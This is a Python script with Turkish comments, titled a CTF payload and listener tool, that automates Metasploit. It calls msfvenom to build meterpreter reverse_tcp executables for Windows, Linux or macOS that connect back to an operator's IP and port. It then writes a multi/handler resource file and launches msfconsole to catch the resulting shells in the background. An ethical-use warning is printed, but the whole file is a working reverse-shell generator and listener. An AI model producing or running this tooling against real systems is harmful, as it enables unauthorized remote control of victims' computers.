#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess # os.system yerine daha güvenli komut çalıştırma için
import tempfile # Geçici kaynak dosyası için
from datetime import datetime
import ipaddress # IP adresi doğrulaması için
import shutil # Komutların varlığını kontrol etmek için (Python 3.3+)

# --- Yardımcı Fonksiyonlar ---

def check_command_exists(command):
    """Belirtilen komutun sistemde bulunup bulunmadığını kontrol eder."""
    if shutil.which(command) is None:
        print(f"[HATA] '{command}' komutu sistemde bulunamadı veya PATH içinde değil.")
        print(f"Lütfen Metasploit Framework'ün kurulu ve PATH'e ekli olduğundan emin olun.")
        return False
    return True

def validate_ip(ip_str):
    """Verilen string'in geçerli bir IPv4 veya IPv6 adresi olup olmadığını kontrol eder."""
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        print(f"[-] Geçersiz IP adresi formatı: {ip_str}")
        return False

def validate_port(port_str):
    """Verilen string'in geçerli bir port numarası olup olmadığını kontrol eder."""
    try:
        port = int(port_str)
        if 1 <= port <= 65535:
            return True
        else:
            print(f"[-] Geçersiz port numarası: {port_str}. (1-65535 arasında olmalı)")
            return False
    except ValueError:
        print(f"[-] Port numarası sayısal olmalı: {port_str}")
        return False

def get_validated_input(prompt, validation_func):
    """Kullanıcıdan girdi alır ve geçerli olana kadar tekrar ister."""
    while True:
        user_input = input(prompt).strip()
        if validation_func(user_input):
            return user_input
        else:
            print("Lütfen geçerli bir değer girin.")

def get_platform_choice():
    """Kullanıcıdan geçerli bir platform seçimi alır."""
    valid_platforms = ["windows", "linux", "mac"]
    while True:
        platform = input("Hedef Platform (windows/linux/mac): ").strip().lower()
        if platform in valid_platforms:
            return platform
        else:
            print(f"[-] Geçersiz platform. Lütfen şunlardan birini seçin: {', '.join(valid_platforms)}")

def get_payload_type(platform):
    """
    Seçilen platforma göre varsayılan payload'u önerir
    ve kullanıcıdan onay veya farklı bir payload alır.
    """
    # Daha modern ve genel payload'lar önerelim
    payload_suggestions = {
        "windows": "windows/x64/meterpreter/reverse_tcp", # 64-bit varsayılan
        "linux": "linux/x64/meterpreter/reverse_tcp",   # 64-bit varsayılan
        "mac": "osx/x64/meterpreter/reverse_tcp"      # 64-bit meterpreter (varsa)
        # Alternatifler:
        # "windows": "windows/meterpreter/reverse_tcp", # 32-bit
        # "linux": "linux/x86/meterpreter/reverse_tcp",   # 32-bit
        # "mac": "osx/armle/meterpreter/reverse_tcp"    # ARM Mac
        # "mac": "osx/x64/shell_reverse_tcp"          # Shell (Meterpreter yerine)
    }
    suggested_payload = payload_suggestions.get(platform, "generic/shell_reverse_tcp") # Bilinmeyen platform için genel shell

    while True:
        payload_input = input(f"Kullanılacak Payload [{suggested_payload}]: ").strip()
        if not payload_input: # Kullanıcı boş bırakırsa öneriyi kullan
            return suggested_payload
        else:
            # Basit bir payload format kontrolü (isteğe bağlı, daha detaylı olabilir)
            if '/' in payload_input and len(payload_input.split('/')) >= 3:
                 print(f"[BİLGİ] Özel payload kullanılıyor: {payload_input}")
                 return payload_input
            else:
                 print("[-] Geçersiz payload formatı. Örnek: windows/x64/meterpreter/reverse_tcp")
                 print(f"   Önerilen: {suggested_payload}")


# --- Ana İşlevler ---

def create_payload(ip, port, platform):
    """msfvenom kullanarak belirtilen platform için payload oluşturur."""
    print("-" * 30)
    print("[İŞLEM] Payload Oluşturma")
    print("-" * 30)

    # Daha modern ve platforma uygun payload'lar seçelim
    payload_options = {
        "windows": ("windows/x64/meterpreter/reverse_tcp", "exe"), # 64-bit varsayılan
        "linux": ("linux/x64/meterpreter/reverse_tcp", "elf"),   # 64-bit varsayılan
        "mac": ("osx/x64/meterpreter/reverse_tcp", "macho")      # 64-bit meterpreter
        # Alternatifler eklenebilir veya kullanıcıdan alınabilir
    }

    # Kullanıcıdan payload tipini al (öneriyle birlikte)
    payload_type = get_payload_type(platform)
    # Dosya uzantısını platforma göre belirle (veya payload'dan tahmin etmeye çalış)
    # Şimdilik basit tutalım ve varsayılanları kullanalım
    _, default_ext = payload_options.get(platform, (None, "bin")) # Bilinmeyen için .bin
    file_ext = input(f"Dosya Uzantısı [{default_ext}]: ").strip() or default_ext


    # Güvenli ve benzersiz dosya adı oluşturma
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    # Platform ve payload tipinden güvenli bir isim türetmeye çalışalım
    safe_payload_name = payload_type.replace('/', '_').replace('\\', '_')
    filename = f"payload_{platform}_{safe_payload_name}_{timestamp}.{file_ext}"
    output_path = os.path.join(os.getcwd(), filename) # Geçerli çalışma dizinine kaydet

    print(f"[+] Payload Tipi: {payload_type}")
    print(f"[+] LHOST: {ip}")
    print(f"[+] LPORT: {port}")
    print(f"[+] Çıktı Dosyası: {output_path}")
    print(f"[+] msfvenom komutu hazırlanıyor...")

    # Komutu subprocess için liste olarak hazırla
    cmd_list = [
        "msfvenom",
        "-p", payload_type,
        f"LHOST={ip}",
        f"LPORT={port}",
        "-f", file_ext,
        "-o", output_path
    ]

    try:
        print(f"[+] Komut çalıştırılıyor: {' '.join(cmd_list)}")
        # subprocess.run kullanarak komutu çalıştır ve sonucunu kontrol et
        result = subprocess.run(cmd_list, check=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
        print("[+] msfvenom başarıyla çalıştı.")
        # print("[+] msfvenom çıktısı (stdout):\n", result.stdout) # İsteğe bağlı çıktı
        if result.stderr:
             print("[!] msfvenom uyarısı/hatası (stderr):\n", result.stderr)
        print(f"[BAŞARILI] Payload oluşturuldu: {filename}")

    except FileNotFoundError:
        print("[HATA] 'msfvenom' komutu bulunamadı. Metasploit Framework kurulu mu?")
    except subprocess.CalledProcessError as e:
        print(f"[HATA] msfvenom çalıştırılırken hata oluştu (Çıkış Kodu: {e.returncode}).")
        print("[HATA] msfvenom stderr çıktısı:")
        print(e.stderr)
        print("[-] Payload oluşturulamadı.")
    except Exception as e:
        print(f"[HATA] Payload oluşturma sırasında beklenmedik bir hata: {e}")

def start_listener(ip, port, payload):
    """Metasploit multi/handler dinleyicisini başlatır."""
    print("-" * 30)
    print("[İŞLEM] Dinleyici Başlatma")
    print("-" * 30)
    print(f"[+] Dinleyici Ayarları:")
    print(f"  Payload: {payload}")
    print(f"  LHOST: {ip}")
    print(f"  LPORT: {port}")

    # Geçici bir kaynak dosyası oluştur
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as rc_file:
            rc_filename = rc_file.name
            rc_file.write("use exploit/multi/handler\n")
            rc_file.write(f"set payload {payload}\n")
            rc_file.write(f"set LHOST {ip}\n")
            rc_file.write(f"set LPORT {port}\n")
            rc_file.write("set ExitOnSession false\n") # Oturum geldiğinde dinleyiciyi kapatma
            rc_file.write("exploit -j -z\n") # Arka planda (-j) ve sessizce (-z) çalıştır
            print(f"[+] Geçici kaynak dosyası oluşturuldu: {rc_filename}")

        print("[+] msfconsole dinleyici modunda başlatılıyor...")
        print("   (msfconsole'u kapatmak için 'exit' veya Ctrl+C kullanın)")

        # msfconsole komutunu subprocess ile çalıştır
        cmd_list = ["msfconsole", "-q", "-r", rc_filename] # -q sessiz mod
        # Not: subprocess.run burada msfconsole bitene kadar bekler.
        # Eğer betiğin devam etmesi gerekiyorsa Popen kullanılabilir.
        subprocess.run(cmd_list) # check=True eklemiyoruz, kullanıcı kapatabilir

        print("[+] msfconsole kapatıldı.")

    except FileNotFoundError:
        print("[HATA] 'msfconsole' komutu bulunamadı. Metasploit Framework kurulu mu?")
    except Exception as e:
        print(f"[HATA] Dinleyici başlatılırken hata oluştu: {e}")
    finally:
        # Geçici kaynak dosyasını silmeye çalış
        if 'rc_filename' in locals() and os.path.exists(rc_filename):
            try:
                os.remove(rc_filename)
                print(f"[+] Geçici kaynak dosyası silindi: {rc_filename}")
            except OSError as e:
                print(f"[UYARI] Geçici kaynak dosyası silinemedi: {rc_filename} - Hata: {e}")

def show_menu():
    """Kullanıcıya ana menüyü gösterir."""
    print("\n" + "=" * 35)
    print("   CTF Payload ve Dinleyici Aracı")
    print("=" * 35)
    print("1. Payload Oluştur")
    print("2. Dinleyici Başlat")
    print("3. Çıkış")
    print("-" * 35)

def display_warning():
     """Etik kullanım uyarısını gösterir."""
     print("\n" + "!" * 40)
     print("! UYARI: ETİK KULLANIM VE YASAL SORUMLULUK !")
     print("!" + "-" * 38 + "!")
     print("! Bu araç, sızma testi ve güvenlik eğitimi amacıyla tasarlanmıştır. !")
     print("! Sadece açık izniniz olan sistemlerde veya yasal CTF        !")
     print("! platformlarında kullanın.                                  !")
     print("! İzinsiz sistemlere payload göndermek veya erişmeye çalışmak !")
     print("! YASA DIŞIDIR ve ciddi sonuçları olabilir.                  !")
     print("! Aracı kullanırken tüm yasalara ve etik kurallara uymak     !")
     print("! tamamen sizin sorumluluğunuzdadır.                         !")
     print("!" * 40 + "\n")


# --- Ana Çalışma Bloğu ---
if __name__ == "__main__":
    display_warning() # Başlangıçta uyarıyı göster

    # Gerekli komutların varlığını kontrol et
    if not check_command_exists("msfvenom") or not check_command_exists("msfconsole"):
        sys.exit(1) # Komutlar yoksa çık

    while True:
        show_menu()
        choice = input("Seçiminiz [1-3]: ").strip()

        if choice == "1":
            print("\n--- Payload Oluşturma ---")
            # Girdileri doğrula
            lhost = get_validated_input("LHOST (Payload'un bağlanacağı sizin IP adresiniz): ", validate_ip)
            lport = get_validated_input("LPORT (Payload'un bağlanacağı sizin portunuz): ", validate_port)
            platform = get_platform_choice()
            # Payload oluşturma fonksiyonunu çağır
            create_payload(lhost, lport, platform)
            print("-" * 30)

        elif choice == "2":
            print("\n--- Dinleyici Başlatma ---")
            # Girdileri doğrula
            listener_lhost = get_validated_input("LHOST (Dinleyicinin çalışacağı IP [genellikle 0.0.0.0]): ", validate_ip)
            listener_lport = get_validated_input("LPORT (Dinleyicinin bekleyeceği port): ", validate_port)
            # Kullanıcıdan platformu tekrar alarak payload önermesi yapalım
            target_platform_for_listener = get_platform_choice()
            listener_payload = get_payload_type(target_platform_for_listener)
            # Dinleyici başlatma fonksiyonunu çağır
            start_listener(listener_lhost, listener_lport, listener_payload)
            print("-" * 30)

        elif choice == "3":
            print("[BİLGİ] Çıkılıyor...")
            break # Döngüyü sonlandır

        else:
            print("[-] Geçersiz seçim. Lütfen 1, 2 veya 3 girin.")

        input("\nDevam etmek için Enter'a basın...") # Her işlemden sonra bekle

